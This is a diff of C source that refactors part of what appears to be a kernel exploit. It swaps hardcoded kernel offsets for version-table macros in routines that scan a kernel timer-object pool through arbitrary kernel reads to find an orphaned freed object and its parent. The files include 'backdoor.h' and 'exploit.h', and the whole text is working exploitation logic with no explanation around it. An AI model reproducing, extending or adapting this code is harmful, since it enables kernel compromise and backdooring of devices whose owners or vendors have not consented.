@@ -4,13 +4,10 @@
 #include <stdio.h>
 #include <string.h>
 #include <util.h>
+#include "common.h"
 #include "cleanup.h"
 #include "backdoor.h"
 #include "exploit.h"
-
-extern void *ktimer_pool_head;
-extern u32 ktimer_pool_size;
-extern u32 ktimer_base_offset;
 
 /* is this valid across versions? */
 #define KTIMER_OBJECT_SIZE 0x3C
@@ -20,37 +17,38 @@ extern u32 ktimer_base_offset;
  * are pointers to the vtable, pointers to kernel objects, and NULL,
  * so this overapproximation is worth the precision tradeoff.
  */
+#define NUM_TIMER_OBJECTS ((u32)(table->ktimer_pool_size / KTIMER_OBJECT_SIZE))
+#define KTIMER_BASE       ((void *)(0xFFF70000 + table->ktimer_base_offset))
+#define KTIMER_END        ((void *)((u32)KTIMER_BASE + (NUM_TIMER_OBJECTS * KTIMER_OBJECT_SIZE)))
+
 #define IS_KERNEL_NON_SLAB_HEAP(addr) (0xFFF00000 <= (u32)(addr) && (u32)(addr) < 0xFFF70000)
-#define TOBJ_ADDR_TO_IDX(base, addr) (((u32)(addr) - (u32)(base)) / KTIMER_OBJECT_SIZE)
-#define TOBJ_IDX_TO_ADDR(base, idx) ((u32)(base) + KTIMER_OBJECT_SIZE * (u32)(idx))
+#define TOBJ_ADDR_TO_IDX(addr)        (((u32)(addr) - (u32)KTIMER_BASE) / KTIMER_OBJECT_SIZE)
+#define TOBJ_IDX_TO_ADDR(idx)         ((u32)KTIMER_BASE + KTIMER_OBJECT_SIZE * (u32)(idx))
 
 static void *find_orphan() {
-  u32 num_timer_objects = ktimer_pool_size / KTIMER_OBJECT_SIZE;
-  void *ktimer_base = (void *)(0xFFF70000 + ktimer_base_offset);
-  void *ktimer_end = (void *)((u32)ktimer_base + (num_timer_objects * KTIMER_OBJECT_SIZE));
 
-  bool reachable[num_timer_objects];
-  memset(reachable, 0, num_timer_objects * sizeof(bool));
+  bool reachable[NUM_TIMER_OBJECTS];
+  memset(reachable, 0, NUM_TIMER_OBJECTS * sizeof(bool));
 
   u32 i = 0;
   /* go through the timer table and find all reachable objects */
-  for (void *current_timer = ktimer_base;
-       current_timer < ktimer_end;
+  for (void *current_timer = KTIMER_BASE;
+       current_timer < KTIMER_END;
        current_timer += KTIMER_OBJECT_SIZE, i++) {
     void *child = (void *)kreadint(current_timer);
 
-    if (TOBJ_ADDR_TO_IDX(ktimer_base, current_timer) != i) {
+    if (TOBJ_ADDR_TO_IDX(current_timer) != i) {
       printf("[!] Got TOBJ_ADDR_TO_IDX(current_timer) != i: 0x%lx != 0x%lx\n",
-             TOBJ_ADDR_TO_IDX(ktimer_base, current_timer), i);
+             TOBJ_ADDR_TO_IDX(current_timer), i);
       wait_for_user();
     }
 
     if (IS_KERNEL_NON_SLAB_HEAP(child)) {
       /* object is allocated, therefore reachable */
-      reachable[TOBJ_ADDR_TO_IDX(ktimer_base, current_timer)] = true;
-    } else if (ktimer_base <= child && child < ktimer_end) {
+      reachable[TOBJ_ADDR_TO_IDX(current_timer)] = true;
+    } else if (KTIMER_BASE <= child && child < KTIMER_END) {
       /* object is freed, next pointer is reachable */
-      reachable[TOBJ_ADDR_TO_IDX(ktimer_base, child)] = true;
+      reachable[TOBJ_ADDR_TO_IDX(child)] = true;
     } else if (child != NULL && child != (void *)TIMER2_NEXT_KERNEL) {
       printf("[!] Warning! Timer table entry had non-vtable, non-freed entry!\n");
       printf("It looks like this: %p -> %p\n", current_timer, child);
@@ -58,25 +56,25 @@ static void *find_orphan() {
     }
   }
 
-  if (i != num_timer_objects) {
+  if (i != NUM_TIMER_OBJECTS) {
     printf("[!] Unexpected number of iterations over timer object list.\n");
-    printf("[!] Got %lu, expected %lu.\n", i, num_timer_objects);
+    printf("[!] Got %lu, expected %lu.\n", i, NUM_TIMER_OBJECTS);
     return NULL;
   }
 
   /* account for list head */
-  void *first_freed = (void *)kreadint(ktimer_pool_head);
+  void *first_freed = (void *)kreadint((void *)table->ktimer_pool_head);
   if (first_freed) {
-    reachable[TOBJ_ADDR_TO_IDX(ktimer_base, first_freed)] = true;
+    reachable[TOBJ_ADDR_TO_IDX(first_freed)] = true;
   }
 
   u32 num_unreachable = 0;
   void *orphan = NULL;
-  for (i = 0; i < num_timer_objects; i++) {
+  for (i = 0; i < NUM_TIMER_OBJECTS; i++) {
     if (!reachable[i]) {
       num_unreachable++;
       /* update only if necessary */
-      orphan = orphan ? orphan : (void *)TOBJ_IDX_TO_ADDR(ktimer_base, i);
+      orphan = orphan ? orphan : (void *)TOBJ_IDX_TO_ADDR(i);
     }
   }
   if (num_unreachable != 1) {
@@ -88,7 +86,7 @@ static void *find_orphan() {
 
 static void **find_parent() {
   // traverse linked list until next points to userspace
-  void *current_node = ktimer_pool_head;
+  void *current_node = (void *)table->ktimer_pool_head;
   while (true) {
     void *next = (void *)kreadint(current_node);
 
